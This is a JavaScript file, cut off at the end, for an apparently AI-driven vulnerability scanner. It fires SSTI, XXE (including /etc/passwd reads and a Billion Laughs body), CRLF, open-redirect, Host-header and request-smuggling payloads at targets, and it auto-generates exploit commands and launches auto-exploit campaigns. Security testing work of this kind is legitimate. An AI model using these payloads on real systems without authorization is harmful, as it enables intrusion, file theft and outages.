import { randomUUID } from 'node:crypto'
import { hexstrike, payloadsRag } from './integrations/index.js'
import { runNativeTool } from './integrations/native-tools.js'
import { aiEngine } from './ai/ai-engine.js'
import { aiFeedbackLoop } from './ai/feedback-loop.js'
import { enrichWithOwasp } from './owasp.js'
import * as db from './db.js'

/**
 * UnifiedPipeline — ONE orchestration flow for both blackbox and whitebox.
 *
 * SentinelAI had two disconnected paths; here every finding (whether from a
 * hexstrike tool or a static code audit) flows through the SAME stages:
 *   collect → OWASP enrich → RAG PoC cross-reference → AI verify → sanitize → persist
 *
 * Emits live events via the provided emitter (WebSocket broadcast).
 */

const SEVERITY_SCORE = { critical: 9.5, high: 7.5, medium: 5.5, low: 3.0, info: 0.5 }
const SEVERITY_RANK = { info: 0, low: 1, medium: 2, high: 3, critical: 4 }

function evidenceTier(finding, targetType) {
  const code = String(finding.evidence?.code || '')
  if (targetType !== 'code') return finding.evidence?.poc ? 'exploited' : 'observed'
  if (/JwtModule\.register|secret\s*:/i.test(code)) return 'validated'
  if (/process\.env\.[A-Z0-9_]+\s*\|\||token|api.?key|secret/i.test(code)) return 'observed'
  if (/query\s*\(|queryRunner\.query|\.query\(/i.test(code) && /\$\{|\+/.test(code)) return 'needs-validation'
  return 'observed'
}

function findingFingerprint(finding) {
  const evidence = finding.evidence || {}
  const file = String(evidence.file || '').replace(/\\/g, '/').toLowerCase()
  const line = evidence.line || ''
  const cwe = String(finding.cweId || finding.cwe || '').toLowerCase()
  const category = /jwt|token|api.?key|secret|credential/i.test(finding.title || '') ? 'credential'
    : /sql injection|raw query|query interpolation/i.test(finding.title || '') ? 'sql-injection' : String(finding.title || '').toLowerCase()
  return `${cwe}|${file}|${line}|${category}`
}

export class UnifiedPipeline {
  constructor({ io } = {}) {
    this.io = io
    // scanId -> { paused: bool, pauseWaiters: [] } — runtime control flags
    this.control = new Map()
    // scanId -> { urls[], tools[], subdomains[], endpoints[], target, startTime }
    this._blackboxMeta = new Map()
  }

  emit(scanId, event, data) {
    this.io?.to(`scan:${scanId}`).emit(event, data)
  }

  _ctl(scanId) {
    if (!this.control.has(scanId)) this.control.set(scanId, { paused: false, stopped: false })
    return this.control.get(scanId)
  }

  /** Pause a running scan (cooperative — takes effect at next checkpoint). */
  pauseScan(scanId) { this._ctl(scanId).paused = true }

  resumeScan(scanId) { this._ctl(scanId).paused = false }

  /** Stop a running scan — causes waitIfPaused to throw, aborting the loop. */
  stopScan(scanId) {
    const ctl = this._ctl(scanId)
    ctl.stopped = true
    ctl.paused = false // unblock any pause waiter so the loop exits
  }

  isPaused(scanId) { return this._ctl(scanId).paused }

  isStopped(scanId) { return this._ctl(scanId).stopped }

  /** Await while paused. Throws if stopped (aborts the scan loop). */
  async waitIfPaused(scanId) {
    while (this.isPaused(scanId) && !this.isStopped(scanId)) {
      await new Promise((r) => setTimeout(r, 400))
    }
    if (this.isStopped(scanId)) throw new Error('SCAN_STOPPED')
  }

  log(scanId, level, message) {
    const ts = new Date().toISOString()
    try {
      db.run(`INSERT INTO logs (scan_id, level, message, ts) VALUES (?,?,?,?)`, scanId, level, message, ts)
    } catch { /* scan may have been deleted mid-execution */ }
    this.emit(scanId, 'scan:log', { scanId, level, message, ts })
  }

  /**
   * Persist + broadcast scan progress. Emits a FLAT payload
   * `{ scanId, progress, status }` (throttled to ~4 updates/sec per scan).
   */
  progress(scanId, progress, status) {
    const pct = Math.max(0, Math.min(100, Math.round(progress)))
    try { db.run(`UPDATE scans SET progress = ? WHERE id = ?`, pct, scanId) } catch { /* non-fatal */ }
    const now = Date.now()
    this._lastProgressEmit = this._lastProgressEmit || new Map()
    const last = this._lastProgressEmit.get(scanId) || 0
    if (pct < 100 && now - last < 250) return
    this._lastProgressEmit.set(scanId, now)
    this.emit(scanId, 'scan:update', { scanId, progress: pct, ...(status ? { status } : {}) })
  }

  /** Persist a finding through the standard enrichment chain. Returns stored record. */
  async ingestFinding(scanId, rawFinding, { verify = true, targetType = 'url' } = {}) {
    // 1. OWASP enrich
    let f = enrichWithOwasp(rawFinding)
    // 2. RAG PoC cross-reference
    try { f = payloadsRag.crossReference(f) } catch { /* non-fatal */ }
    // 3. Severity sanity check — prevent AI from over-classifying low-impact findings
    f = enforceSeverityBounds(f)
    // 4. AI verification (specialist-routed)
    let verdict = null
    if (verify) {
      try {
        const v = await aiEngine.verifyFinding(f, targetType)
        verdict = v
        if (!v.isTruePositive) {
          // Code candidates already contain exact file/line evidence from the
          // deterministic scanner or the specialist audit. Keep them visible
          // as needs-validation when the secondary verifier is conservative;
          // otherwise a provider/model change can make an entire codebase
          // appear clean without any evidence being lost.
          if (targetType !== 'code') {
            this.log(scanId, 'info', `🤖 [${v.agent}] discarded false positive: ${f.title}`)
            return null
          }
          f.evidence = { ...(f.evidence || {}), aiRejected: true, validationTier: 'needs-validation' }
          this.log(scanId, 'info', `🤖 [${v.agent}] retained code candidate for validation: ${f.title}`)
        }
        if (v.refined) f = v.refined
        if (v.evidenceTier) f.evidence = { ...(f.evidence || {}), aiEvidenceTier: v.evidenceTier }
      } catch { /* keep original on error */ }
    }
    // 4. (sanitize removed — raw evidence preserved)
    const tier = f.evidence?.aiEvidenceTier === 'needs-validation' ? 'needs-validation' : evidenceTier(f, targetType)
    f.evidence = { ...(f.evidence || {}), validationTier: tier }

    // Merge repeated detections from pattern scanning and AI audit passes.
    const fingerprint = findingFingerprint(f)
    const existing = db.all(`SELECT * FROM findings WHERE scan_id = ?`, scanId).find((row) => {
      try { return JSON.parse(row.evidence || '{}').fingerprint === fingerprint } catch { return false }
    })
    if (existing) {
      const evidence = JSON.parse(existing.evidence || '{}')
      const sources = new Set([...(evidence.sources || [existing.module]), f.module || 'unknown'])
      const severity = SEVERITY_RANK[f.severity] > SEVERITY_RANK[existing.severity] ? f.severity : existing.severity
      db.run(`UPDATE findings SET severity = ?, cvss = ?, evidence = ? WHERE id = ?`, severity,
        Math.max(existing.cvss || 0, f.cvss || SEVERITY_SCORE[f.severity] || 0),
        JSON.stringify({ ...evidence, sources: [...sources] }), existing.id)
      this.log(scanId, 'info', `↪ Deduplicated finding: ${f.title}`)
      return db.get(`SELECT * FROM findings WHERE id = ?`, existing.id)
    }
    f.evidence = { ...f.evidence, fingerprint, sources: [f.module || 'unknown'] }

    // ── AI PoC GENERATION: Generate a specific, working exploit PoC ──
    // After verification, ask the AI to generate a tailored exploit for this
    // specific finding. This produces copy-pasteable attack commands instead
    // of generic category-based text.
    if (verdict?.isTruePositive || targetType === 'code') {
      try {
        const aiPoc = await aiEngine.generateExploitPoc(f, targetType)
        if (aiPoc && (aiPoc.attackCommand || aiPoc.pocPayload)) {
          // Merge AI PoC with existing RAG PoC references
          const existingPoc = f.poc || {}
          f.poc = {
            ...existingPoc,
            aiGenerated: true,
            source: 'ai-generated',
            pocPayload: aiPoc.pocPayload,
            attackCommand: aiPoc.attackCommand,
            exploitSteps: aiPoc.exploitSteps,
            impact: aiPoc.impact,
            prerequisites: aiPoc.prerequisites,
          }
          this.log(scanId, 'info', `⚔️ AI PoC generated for: ${f.title}`)
        }
      } catch (e) {
        this.log(scanId, 'warn', `⚠️ AI PoC generation failed for "${f.title}": ${e.message}`)
      }
    }

    // ── AI FEEDBACK LOOP: Dynamic self-correction ──
    // Review the AI's output for errors; if found, re-prompt the AI to fix them.
    // This creates the loop: AI → finding → review → error? → re-prompt → corrected finding
    try {
      const correction = await aiFeedbackLoop.selfCorrect(
        f, targetType,
        (sid, lvl, msg) => this.log(sid, lvl, msg),
        scanId
      )
      if (correction.corrected) {
        f = correction.finding
        this.log(scanId, 'info', `🔄 AI feedback loop corrected finding: ${f.title}`)
      }
      aiFeedbackLoop.logReview(scanId, null, correction.reviewLog, correction.corrected)
    } catch (e) {
      this.log(scanId, 'warn', `⚠️ AI feedback loop error: ${e.message}`)
    }

    const id = `fnd_${randomUUID()}`
    const now = new Date().toISOString()
    try {
      db.run(
        `INSERT INTO findings (id, scan_id, title, severity, cvss, cwe_id, cve_id, owasp_category, description, layman_impact, remediation, module, status, evidence, poc, agent_verdict, created_at)
         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
        id, scanId, f.title || 'Untitled finding', f.severity || 'info',
        f.cvss ?? SEVERITY_SCORE[f.severity] ?? 0, f.cweId || f.cwe || null, f.cveId || null,
        f.owaspCategory || null, f.description || '', f.laymanImpact || null, f.remediation || '',
        f.module || 'unknown', 'open',
        JSON.stringify(f.evidence || {}), JSON.stringify(f.poc || {}),
        verdict ? JSON.stringify({ agent: verdict.agent, confidence: verdict.confidence, reasoning: verdict.verdict }) : null,
        now
      )
      const stored = db.get(`SELECT * FROM findings WHERE id = ?`, id)
      this.emit(scanId, 'scan:finding', { scanId, finding: stored })

      // ── AUTO-EXPLOIT: launch campaign for verified high/critical findings ──
      // Only auto-trigger on high-confidence verified findings to prevent noise
      if (verdict?.isTruePositive && verdict.confidence >= 70 && ['critical', 'high'].includes(stored.severity)) {
        this._autoExploit(scanId, stored)
      }

      return stored
    } catch (e) {
      this.log(scanId, 'warn', `⚠ DB insert failed for finding "${f.title}": ${e.message}`)
      return null
    }
  }

  // ── BLACKBOX ───────────────────────────────────────────────────────────────
  async runBlackbox(scan, { modules = [], objective = 'comprehensive', maxTools = 6, verify = true, depth = 'standard' } = {}) {
    const scanId = scan.id
    // Reset & start token tracking for this scan
    this._startTokenTracking(scanId)
    const target = scan.target
    this._currentTarget = target
    this.log(scanId, 'info', `▶ Blackbox scan started on ${target} (depth=offensive — all probes active)`)
    this.progress(scanId, 2)

    // ── Blackbox metadata tracking (mirrors whiteboxMeta for UI) ──
    const meta = {
      startTime: new Date().toISOString(),
      urls: [],           // all URLs discovered/crawled
      tools: [],          // tools executed with status + timing
      subdomains: [],     // subdomains discovered
      endpoints: [],      // parameterized endpoints found
      target,
    }
    this._blackboxMeta.set(scanId, meta)

    const _saveMeta = () => {
      try {
        const m = this._blackboxMeta.get(scanId)
        if (m) db.run(`UPDATE scans SET blackbox_meta = ? WHERE id = ?`, JSON.stringify(m), scanId)
      } catch { /* non-fatal */ }
    }
    // Helper to add a URL to the meta list (deduplicated, capped at 500)
    const _addUrl = (url) => {
      if (!url || typeof url !== 'string') return
      const u = url.replace(/#.*$/, '').trim()
      if (!u || u.length < 5) return
      if (!meta.urls.includes(u)) {
        meta.urls.push(u)
        if (meta.urls.length > 500) meta.urls = meta.urls.slice(-500)
      }
    }
    const _addTool = (tool, status, durationMs, error) => {
      meta.tools.push({ tool, status, durationMs: durationMs || 0, error: error || null })
      _saveMeta()
    }
    // Override _collectUrls to also populate meta
    const origCollectUrls = this._collectUrls.bind(this)
    this._collectUrls = (sid, urls) => {
      origCollectUrls(sid, urls)
      if (sid === scanId && Array.isArray(urls)) {
        for (const u of urls) _addUrl(u)
      }
    }
    _saveMeta()

    const engine = await hexstrike.engineStatus()
    if (!engine.available) {
      this.log(scanId, 'warn', `Hexstrike engine offline (${engine.error || 'offline'}). Switching to Native Scanner Engine...`)
      await this.runNativeBlackbox(scan, { verify })
      return
    }
    this.log(scanId, 'info', `Hexstrike engine v${engine.version} online — ${engine.totalToolsAvailable}/${engine.totalTools} tools available`)

    // Always audit HTTP security headers + sensitive paths first (fast, high-signal).
    // HexStrike tools do not cover these, so run the native checks regardless of engine.
    await this.auditHttpBaseline(scanId, scan.target, { verify, targetType: scan.target_type })
    _addUrl(/^https?:\/\//i.test(target) ? target : `https://${target}`)
    this.progress(scanId, 8)

    // Skip wpscan if the target is not WordPress (saves ~2 min + avoids Ruby errors).
    if (modules.includes('wpscan')) {
      const isWp = await this._isWordPress(scan.target)
      if (!isWp) {
        modules = modules.filter(m => m !== 'wpscan')
        this.log(scanId, 'info', '⏭ Skipping wpscan — target is not WordPress')
      }
    }

    // ── SUBDOMAIN + API/SWAGGER DISCOVERY ──
    // When the target is a bare host/domain (not a full URL path), enumerate
    // subdomains passively + actively, then probe each for Swagger/OpenAPI docs.
    if (/^https?:\/\//i.test(target) || !/\//.test(target)) {
      await this._runSubdomainDiscovery(scanId, target, { verify })
    }
    this.progress(scanId, 12)

    // If no explicit modules → use hexstrike intelligent smart-scan (AI tool selection)
    if (!modules.length) {
      this.log(scanId, 'info', `Delegating to Hexstrike IntelligentDecisionEngine (objective=${objective}, maxTools=${maxTools})`)
      const res = await hexstrike.smartScan(target, { objective, maxTools })
      if (!res.success && res.error) {
        this.log(scanId, 'warn', `Smart scan failed: ${res.error}. Falling back to Native Scanner Engine...`)
        // Use REAL native tool names only — no http-headers/path-enum (those are
        // internal checks already covered by auditHttpBaseline, not NATIVE_TOOLS).
        await this.runNativeBlackbox(scan, {
          verify,
          modules: ['nmap', 'whatweb', 'wafw00f', 'nikto', 'ffuf', 'gobuster', 'katana', 'nuclei', 'arjun', 'dalfox', 'wpscan'],
        })
        return
      }
      await this.processSmartScanResults(scanId, res, { verify, targetType: scan.target_type })
      this.progress(scanId, 70)
    } else {
      // Run chosen tools sequentially via their dedicated endpoints
      let done = 0
      for (const mod of modules) {
        await this.waitIfPaused(scanId)
        const mapping = hexstrike.MODULE_TOOL_MAP[mod]
        if (!mapping) { this.log(scanId, 'warn', `Unknown module: ${mod}`); continue }
        const params = mapping.params(target)
        // Always aggressive: nmap runs NSE vuln scripts (heartbleed, ms17-010, shellshock, default-creds)
        if (mod === 'nmap') {
          params.scan_type = '-sCV --script vuln'
          params.additional_args = '-T4 -Pn --script-timeout 3m'
        }
        // Always aggressive: ffuf uses the bigger raft wordlist for deeper path discovery
        if (mod === 'ffuf') {
          params.wordlist = '/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt'
        }
        this.log(scanId, 'info', `▶ Running tool: ${mod} [offensive]${mapping.nativeOnly ? ' (native)' : ''}`)
        const t0 = Date.now()
        let res
        if (mapping.nativeOnly) {
          // No HexStrike endpoint exists — run native directly.
          res = { success: false, error: 'native-only tool', _skipHex: true }
        } else {
          res = await hexstrike.runTool(mapping.tool, params)
        }
        const t1 = Date.now()
        const finalStatus = await this.processToolOutput(scanId, mod, res, { verify, targetType: scan.target_type })
        _addTool(mod, finalStatus, t1 - t0, res?.error || null)
        done++
        // Tool phase spans 12% → 70%; injection chaining + offensive stages take the rest.
        this.progress(scanId, 12 + (done / modules.length) * 58)
      }
    }

    // ── INJECTION CHAINING STAGE ──
    // Feed parameterized URLs discovered by katana/ffuf/arjun into dalfox (XSS)
    // and sqlmap (SQLi). This is where most SEVERE vulns are actually found.
    await this.chainInjectionTests(scanId, { verify, targetType: scan.target_type, offensive: true })
    this.progress(scanId, 70)

    // ── OFFENSIVE STAGES (always active) ──
    await this._probeServiceVulns(scanId, target, { verify })
    this.progress(scanId, 75)
    await this._probeAdvancedAttackVectors(scanId, target, { verify })
    this.progress(scanId, 82)
    await this._discoverLoginSurfaces(scanId, target, { verify })
    await this._matchOffsecPayloads(scanId)
    this.progress(scanId, 88)

    // ── RESPONSE BODY SCANNING ──
    await this._scanResponseBodies(scanId, target, { verify })
    this.progress(scanId, 90)

    // ── COOKIE + CORS + HTML FORM HARVESTING ──
    await this._auditCookiesCors(scanId, target, { verify })
    this.progress(scanId, 95)

    this.finish(scanId, 'completed')
  }

  /**
   * OFFENSIVE: advanced attack vector probes — SSTI, XXE, CSRF, JWT analysis,
   * GraphQL introspection, Host Header injection, Open Redirect, CRLF injection,
   * HTTP Request Smuggling, CORS misconfiguration (deep check).
   * These are the attacks that basic scanners miss.
   */
  async _probeAdvancedAttackVectors(scanId, target, { verify } = {}) {
    const base = /^https?:\/\//i.test(target) ? target : `https://${target}`
    this.log(scanId, 'info', `⚔️ Advanced attack vectors: SSTI / XXE / CSRF / JWT / GraphQL / Host Header / CRLF / Smuggling...`)

    // ── SSTI (Server-Side Template Injection) probes ──
    const sstiPayloads = [
      { name: 'Jinja2/Twig', payload: '{{7*7}}', expect: '49' },
      { name: 'Jinja2', payload: '{{config}}', expect: 'Config' },
      { name: 'Twig', payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}', expect: null },
      { name: 'EJS', payload: '<%= 7*7 %>', expect: '49' },
      { name: 'ERB', payload: '<%= 7*7 %>', expect: '49' },
      { name: 'FreeMarker', payload: '${7*7}', expect: '49' },
      { name: 'Velocity', payload: '#set($x=7*7)${x}', expect: '49' },
      { name: 'Smarty', payload: '{php}echo 7*7;{/php}', expect: '49' },
      { name: 'Handlebars', payload: '{{constructor.constructor("return 7*7")()}}', expect: null },
    ]
    // Collect parameterized URLs for SSTI testing
    const urls = this._urlPool?.get(scanId) ? [...this._urlPool.get(scanId)].slice(0, 10) : [base]
    for (const url of urls) {
      if (!/\?[^=]+=/.test(url)) continue
      await this.waitIfPaused(scanId)
      for (const ssti of sstiPayloads) {
        try {
          const testUrl = url.replace(/([?&])([^=]+)=([^&]*)/, `$1$2=${encodeURIComponent(ssti.payload)}`)
          const res = await fetch(testUrl, { redirect: 'follow', signal: AbortSignal.timeout(8000) })
          const body = await res.text()
          if (ssti.expect && body.includes(ssti.expect)) {
            await this.ingestFinding(scanId, {
              title: `SSTI (${ssti.name}) — template injection confirmed`,
              severity: 'critical',
              cweId: 'CWE-1336',
              owaspCategory: 'A03:2021-Injection',
              description: `Server-Side Template Injection (${ssti.name}) confirmed at ${url}. Payload "${ssti.payload}" returned "${ssti.expect}" in the response. This allows arbitrary code execution on the server.`,
              remediation: 'Never pass user input directly to template render functions. Use a sandboxed template engine, or sanitize input before rendering.',
              module: 'advanced:ssti',
              evidence: { url, payload: ssti.payload, engine: ssti.name, response: body.slice(0, 300) },
            }, { verify })
            this.log(scanId, 'info', `⚔️ SSTI (${ssti.name}) CONFIRMED at ${url}`)
            break // one confirmed SSTI per URL is enough
          }
        } catch { /* skip */ }
      }
    }

    // ── XXE (XML External Entity) probes ──
    const xxePayloads = [
      { name: 'Basic XXE', contentType: 'application/xml', body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, expect: /root:/ },
      { name: 'XXE via SVG', contentType: 'image/svg+xml', body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>`, expect: null },
      { name: 'XXE Billion Laughs', contentType: 'application/xml', body: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>`, expect: null },
    ]
    for (const xxe of xxePayloads) {
      await this.waitIfPaused(scanId)
      try {
        const res = await fetch(base, {
          method: 'POST',
          headers: { 'Content-Type': xxe.contentType },
          body: xxe.body,
          signal: AbortSignal.timeout(10000),
        })
        const body = await res.text()
        if (xxe.expect && xxe.expect.test(body)) {
          await this.ingestFinding(scanId, {
            title: `XXE (${xxe.name}) — XML External Entity injection confirmed`,
            severity: 'critical',
            cweId: 'CWE-611',
            owaspCategory: 'A05:2021-Security Misconfiguration',
            description: `XML External Entity injection confirmed at ${base}. The server processed an external entity reference and returned file contents. This allows reading arbitrary files from the server and performing SSRF.`,
            remediation: 'Disable external entity processing in the XML parser. Set FEATURE_SECURE_PROCESSING=true (Java), libxml_disable_entity_loader(true) (PHP), or use defusedxml (Python).',
            module: 'advanced:xxe',
            evidence: { url: base, payload: xxe.body.slice(0, 200), response: body.slice(0, 300) },
          }, { verify })
          this.log(scanId, 'info', `⚔️ XXE (${xxe.name}) CONFIRMED at ${base}`)
          break
        }
      } catch { /* skip */ }
    }

    // ── CSRF token validation check ──
    // Only flag POST/PUT/DELETE forms (GET forms like search bars don't need CSRF)
    // Skip SPAs — React/Vue/Angular handle CSRF via JS headers, not HTML tokens
    await this.waitIfPaused(scanId)
    try {
      const res = await fetch(base, { redirect: 'follow', signal: AbortSignal.timeout(10000) })
      const body = await res.text()
      const hasCsrfToken = /csrf|_token|xsrf|__RequestVerificationToken|nonce/i.test(body)
      const isSpa = /id="(root|app|__next)"/.test(body) || /React|Vue|Angular|__NEXT_DATA__/.test(body)
      const formMatches = body.match(/<form[\s\S]*?<\/form>/gi) || []
      const statefulForms = formMatches.filter(f => {
        const method = (f.match(/method\s*=\s*["']([^"']+)["']/i) || [])[1] || 'get'
        return /post|put|delete|patch/i.test(method)
      })
      if (statefulForms.length && !hasCsrfToken && !isSpa) {
        await this.ingestFinding(scanId, {
          title: 'CSRF: State-changing forms without CSRF token protection',
          severity: 'medium',
          cweId: 'CWE-352',
          owaspCategory: 'A01:2021-Broken Access Control',
          description: `${statefulForms.length} POST/PUT/DELETE form(s) found at ${base} without CSRF tokens. Attackers can craft malicious pages that make authenticated requests on behalf of victims.`,
          remediation: 'Add anti-CSRF tokens to all state-changing forms. For SPAs, use SameSite=Strict cookies + custom request headers.',
          module: 'advanced:csrf',
          evidence: { url: base, statefulForms: statefulForms.length },
        }, { verify })
        this.log(scanId, 'info', '⚔️ CSRF: state-changing forms without tokens detected')
      }
    } catch { /* skip */ }

    // ── JWT analysis (check for none algorithm, weak secrets, etc.) ──
    await this.waitIfPaused(scanId)
    try {
      // First, look for JWT in cookies, localStorage, or Authorization headers in responses
      const res = await fetch(base, { redirect: 'follow', signal: AbortSignal.timeout(10000) })
      const body = await res.text()
      const headers = Object.fromEntries(res.headers.entries())
      const jwtRe = /eyJ[a-zA-Z0-9_-]{8,}\.eyJ[a-zA-Z0-9_-]{8,}\.[a-zA-Z0-9_\-]{8,}/g
      const jwts = [...(body.matchAll(jwtRe) || []), ...((headers['set-cookie'] || '').matchAll(jwtRe) || [])].map(m => m[0])
      if (jwts.length) {
        for (const token of [...new Set(jwts)].slice(0, 3)) {
          try {
            const parts = token.split('.')
            const header = JSON.parse(Buffer.from(parts[0], 'base64').toString())
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString())
            const issues = []
            if (header.alg === 'none') issues.push('JWT uses "none" algorithm — ACCEPTS UNSIGNED TOKENS')
            if (header.alg === 'HS256' && !header.typ) issues.push('JWT HS256 without explicit typ — may be vulnerable to algorithm confusion')
            if (payload.exp && payload.exp * 1000 < Date.now()) issues.push('JWT is expired')
            if (!payload.exp) issues.push('JWT has no expiration — token is valid forever')
            if (payload.iat && (Date.now() / 1000 - payload.iat) > 86400 * 30) issues.push('JWT issued >30 days ago — excessive lifetime')
            if (issues.length) {
              await this.ingestFinding(scanId, {
                title: `JWT security issues: ${issues.slice(0, 2).join('; ')}`,
                severity: header.alg === 'none' ? 'critical' : 'medium',
                cweId: header.alg === 'none' ? 'CWE-347' : 'CWE-345',
                owaspCategory: 'A02:2021-Cryptographic Failures',
                description: `JWT token found at ${base} with ${issues.length} security issues: ${issues.join(' | ')}. Header: ${JSON.stringify(header)}`,
                remediation: 'Enforce a specific algorithm (RS256/ES256), require exp claim with short TTL (<24h), and reject "none" algorithm tokens.',
                module: 'advanced:jwt',
                evidence: { url: base, header: JSON.stringify(header), payload: JSON.stringify(payload).slice(0, 200), issues },
              }, { verify })
              this.log(scanId, 'info', `⚔️ JWT issues found: ${issues.join(', ')}`)
            }
          } catch { /* malformed JWT */ }
        }
      }
    } catch { /* skip */ }

    // ── GraphQL introspection probe ──
    const graphqlPaths = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql', '/query', '/gql']
    for (const gqlPath of graphqlPaths) {
      await this.waitIfPaused(scanId)
      const gqlUrl = `${base.replace(/\/$/, '')}${gqlPath}`
      try {
        const res = await fetch(gqlUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ query: '{ __schema { types { name } } }' }),
          signal: AbortSignal.timeout(8000),
        })
        const body = await res.text()
        if (body.includes('__schema') && body.includes('types')) {
          await this.ingestFinding(scanId, {
            title: 'GraphQL introspection enabled — full API schema exposed',
            severity: 'medium',
            cweId: 'CWE-200',
            owaspCategory: 'A05:2021-Security Misconfiguration',
            description: `GraphQL introspection is enabled at ${gqlUrl}. Attackers can enumerate the entire API schema, including all types, queries, mutations, and fields. This is a blueprint for targeted attacks.`,
            remediation: 'Disable GraphQL introspection in production. Use persisted queries or a query whitelist.',
            module: 'advanced:graphql',
            evidence: { url: gqlUrl, schema: body.slice(0, 500) },
          }, { verify })
          this.log(scanId, 'info', `⚔️ GraphQL introspection ENABLED at ${gqlUrl}`)
          // Also try to get the schema SDL via /graphql?sdl
          discoveredUrls.push(gqlUrl)
          break
        }
      } catch { /* skip */ }
    }

    // ── Host Header injection probe ──
    await this.waitIfPaused(scanId)
    try {
      const evilHost = 'evil.attacker.com'
      const res = await fetch(base, {
        redirect: 'follow',
        headers: { 'Host': evilHost, 'X-Forwarded-Host': evilHost },
        signal: AbortSignal.timeout(10000),
      })
      const body = await res.text()
      if (body.includes(evilHost)) {
        await this.ingestFinding(scanId, {
          title: 'Host Header injection — reflected in response',
          severity: 'medium',
          cweId: 'CWE-644',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          description: `The server reflects the Host header in responses. Attackers can poison caches, bypass security controls, or perform password reset poisoning by injecting a malicious Host header.`,
          remediation: 'Validate the Host header against a whitelist. Use absolute URLs in redirects and password reset links.',
          module: 'advanced:host-header',
          evidence: { url: base, injectedHost: evilHost, response: body.slice(0, 300) },
        }, { verify })
        this.log(scanId, 'info', `⚔️ Host Header injection reflected at ${base}`)
      }
    } catch { /* skip */ }

    // ── Open Redirect probe ──
    await this.waitIfPaused(scanId)
    try {
      const redirectTarget = 'https://evil.attacker.com'
      const testUrls = [
        `${base.replace(/\/$/, '')}?redirect=${encodeURIComponent(redirectTarget)}`,
        `${base.replace(/\/$/, '')}?url=${encodeURIComponent(redirectTarget)}`,
        `${base.replace(/\/$/, '')}?next=${encodeURIComponent(redirectTarget)}`,
        `${base.replace(/\/$/, '')}?return=${encodeURIComponent(redirectTarget)}`,
        `${base.replace(/\/$/, '')}?goto=${encodeURIComponent(redirectTarget)}`,
        `${base.replace(/\/$/, '')}?returnUrl=${encodeURIComponent(redirectTarget)}`,
        `${base.replace(/\/$/, '')}?callback=${encodeURIComponent(redirectTarget)}`,
      ]
      for (const testUrl of testUrls) {
        try {
          const res = await fetch(testUrl, { redirect: 'manual', signal: AbortSignal.timeout(8000) })
          const location = res.headers.get('location') || ''
          if (res.status >= 300 && res.status < 400 && location.includes(redirectTarget)) {
            await this.ingestFinding(scanId, {
              title: `Open Redirect — ${testUrl.slice(0, 100)}`,
              severity: 'medium',
              cweId: 'CWE-601',
              owaspCategory: 'A01:2021-Broken Access Control',
              description: `The server redirects to a user-controlled URL. Attackers can use this for phishing — crafting a URL that looks like your domain but redirects to a malicious login page.`,
              remediation: 'Validate redirect URLs against a whitelist. Never redirect to user-supplied absolute URLs.',
              module: 'advanced:open-redirect',
              evidence: { url: testUrl, redirectsTo: location },
            }, { verify })
            this.log(scanId, 'info', `⚔️ Open Redirect at ${testUrl}`)
            break
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }

    // ── CRLF injection probe ──
    await this.waitIfPaused(scanId)
    try {
      const crlfPayload = 'test%0d%0aSet-Cookie:%20crlftest=injected%0d%0a'
      const testUrl = `${base.replace(/\/$/, '')}?q=${crlfPayload}`
      const res = await fetch(testUrl, { redirect: 'follow', signal: AbortSignal.timeout(8000) })
      const setCookie = res.headers.get('set-cookie') || ''
      if (setCookie.includes('crlftest')) {
        await this.ingestFinding(scanId, {
          title: 'CRLF injection — HTTP response splitting',
          severity: 'high',
          cweId: 'CWE-113',
          owaspCategory: 'A03:2021-Injection',
          description: `CRLF injection confirmed at ${base}. The server reflects user input in HTTP headers, allowing attackers to inject arbitrary headers (Set-Cookie, Location, etc.) or split the response.`,
          remediation: 'Validate and sanitize all user input before including it in HTTP headers. Strip CR/LF characters from header values.',
          module: 'advanced:crlf',
          evidence: { url: testUrl, injectedCookie: setCookie },
        }, { verify })
        this.log(scanId, 'info', `⚔️ CRLF injection CONFIRMED at ${base}`)
      }
    } catch { /* skip */ }

    // ── HTTP Request Smuggling probe (CL.TE / TE.CL) ──
    // This is a lightweight probe — a full smuggling test requires raw sockets.
    // We detect if the server uses a proxy that may be vulnerable.
    await this.waitIfPaused(scanId)
    try {
      // Send a request with conflicting Content-Length and Transfer-Encoding
      const smugglingBody = '0\r\n\r\nGET /__smuggling_probe__ HTTP/1.1\r\nHost: smuggling-test\r\n\r\n'
      const res = await fetch(base, {
        method: 'POST',
        headers: {
          'Content-Length': String(smugglingBody.length + 20),
          'Transfer-Encoding': 'chunked',
        },
        body: smugglingBody,
        signal: AbortSignal.timeout(8000),
      })
      // HTTP Request Smuggling requires raw socket verification to confirm.
      // A server returning < 500 to a malformed request is NOT evidence of smuggling —
      // virtually every server does this. Only log for informational purposes.
      if (res.status < 400) {
        this.log(scanId, 'info', '⚔️ HTTP Smuggling probe: server accepted conflicting headers — needs raw socket verification (not a confirmed finding)')
      }
    } catch { /* skip */ }

    this.log(scanId, 'info', '⚔️ Advanced attack vectors complete')
  }
  async _probeServiceVulns(scanId, target, { verify } = {}) {
    const host = (() => {
      try { return new URL(/^https?:\/\//i.test(target) ? target : `https://${target}`).hostname }
      catch { return target.replace(/^https?:\/\//i, '').split('/')[0] }
    })()
    this.log(scanId, 'info', `⚔️ Offensive service-vuln probing on ${host} (heartbleed / ms17-010 / ftp-anon / ssl-poodle)...`)
    const scripts = [
      { name: 'ssl-heartbleed', args: ['--script', 'ssl-heartbleed', '-p', '443'], cve: 'CVE-2014-0160', sev: 'critical' },
      { name: 'ssl-poodle', args: ['--script', 'ssl-poodle', '-p', '443'], cve: 'CVE-2014-3566', sev: 'medium' },
